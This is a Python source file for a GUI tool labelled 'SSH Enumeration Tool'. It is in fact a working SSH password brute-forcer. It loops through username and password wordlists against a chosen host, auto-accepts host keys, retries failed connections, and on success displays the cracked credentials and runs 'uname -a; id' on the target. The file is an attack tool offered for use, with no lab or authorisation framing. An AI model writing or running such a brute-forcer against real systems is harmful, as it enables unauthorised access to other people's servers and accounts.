import tkinter as tk
from tkinter import filedialog, messagebox
import paramiko
import time

class SSHEnumerationTool:
    def __init__(self, root):
        self.root = root
        self.root.title("SSH Enumeration Tool")
        self.root.geometry("500x400")

        # Host and Port Entry section
        self.host_label = tk.Label(root, text="Host:")
        self.host_label.grid(row=0, column=0, padx=10, pady=5, sticky="e")
        self.host_entry = tk.Entry(root, width=30)
        self.host_entry.grid(row=0, column=1, padx=10, pady=5)

        self.port_label = tk.Label(root, text="Port:")
        self.port_label.grid(row=1, column=0, padx=10, pady=5, sticky="e")
        self.port_entry = tk.Entry(root, width=30)
        self.port_entry.grid(row=1, column=1, padx=10, pady=5)
        self.port_entry.insert(0, "22")

        # Username Wordlist
        self.username_list_label = tk.Label(root, text="Username Wordlist:")
        self.username_list_label.grid(row=2, column=0, padx=10, pady=5, sticky="e")
        self.username_list_entry = tk.Entry(root, width=20, state="readonly")
        self.username_list_entry.grid(row=2, column=1, padx=10, pady=5)
        self.username_browse_button = tk.Button(root, text="Browse", command=self.browse_username_wordlist)
        self.username_browse_button.grid(row=2, column=2, padx=5, pady=5)

        # Password Wordlist
        self.password_list_label = tk.Label(root, text="Password Wordlist:")
        self.password_list_label.grid(row=3, column=0, padx=10, pady=5, sticky="e")
        self.password_list_entry = tk.Entry(root, width=20, state="readonly")
        self.password_list_entry.grid(row=3, column=1, padx=10, pady=5)
        self.password_browse_button = tk.Button(root, text="Browse", command=self.browse_password_wordlist)
        self.password_browse_button.grid(row=3, column=2, padx=5, pady=5)

        # Enumeration Button
        self.enumerate_button = tk.Button(root, text="Enumerate", command=self.enumerate_ssh, bg="green", fg="white")
        self.enumerate_button.grid(row=4, column=0, columnspan=3, padx=10, pady=10, sticky="nsew")

        # Result Display
        self.current_combination_label = tk.Label(root, text="Correct Combination:", font=("Helvetica", 12, "bold"))
        self.current_combination_label.grid(row=5, column=0, columnspan=3, padx=10, pady=5, sticky="w")
        self.current_combination_text = tk.Text(root, height=5, width=40, wrap="word")
        self.current_combination_text.grid(row=6, column=0, columnspan=3, padx=10, pady=5, sticky="nsew")

        # Grid Configuration
        root.grid_rowconfigure(6, weight=1)
        root.grid_columnconfigure(1, weight=1)

        # Exit button
        self.exit_button = tk.Button(root, text="Exit", command=self.exit_application)
        self.exit_button.grid(row=7, column=0, columnspan=3, pady=10)

    def browse_username_wordlist(self):
        filename = filedialog.askopenfilename()
        if filename:
            self.username_list_entry.config(state="normal")
            self.username_list_entry.delete(0, tk.END)
            self.username_list_entry.insert(0, filename)
            self.username_list_entry.config(state="readonly")

    def browse_password_wordlist(self):
        filename = filedialog.askopenfilename()
        if filename:
            self.password_list_entry.config(state="normal")
            self.password_list_entry.delete(0, tk.END)
            self.password_list_entry.insert(0, filename)
            self.password_list_entry.config(state="readonly")

    def execute_command(self, client, command):
        stdin, stdout, stderr = client.exec_command(command)
        result = "\n" #command output line
        for line in stdout:
            result += line.strip() + "\n"
        return result

    def enumerate_ssh(self):
        host = self.host_entry.get()
        port = int(self.port_entry.get())
        username_wordlist = self.username_list_entry.get()
        password_wordlist = self.password_list_entry.get()
        command = "uname -a; id"  # command to execute after successful connection to the target

        try:
            with open(username_wordlist, 'r') as users:
                for user in users:
                    user = user.strip()
                    with open(password_wordlist, 'r') as passwords:
                        for password in passwords:
                            password = password.strip()
                            try:
                                client = paramiko.SSHClient()
                                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                                retry_count = 3
                                while retry_count > 0:
                                    try:
                                        client.connect(hostname=host, port=port, username=user, password=password, timeout=5)
                                        self.current_combination_text.delete('1.0', tk.END)
                                        self.current_combination_text.insert(tk.END, f"Username: {user}\nPassword: {password}\n")
                                        result = self.execute_command(client, command)
                                        result_message = f"=== SSH Enumeration Results ===\nMatched Credentials: Username: {user}\nPassword: {password}\n{result}"
                                        messagebox.showinfo("Enumeration Results", result_message)
                                        client.close()
                                        return  # Break out of the loop after successful connection
                                    except paramiko.AuthenticationException:
                                        break
                                    except Exception as e:
                                        retry_count -= 1
                                        if retry_count == 0:
                                            raise e
                                        time.sleep(1)  # Wait one second after trying to connect
                            except Exception as e:
                                messagebox.showerror("Error", str(e))
        except Exception as e:
            messagebox.showerror("Error", str(e))


    def exit_application(self):
        if messagebox.askokcancel("Exit", "Are you sure you want to exit?"):
            self.root.quit()

if __name__ == "__main__":
    root = tk.Tk()
    app = SSHEnumerationTool(root)
    root.mainloop()
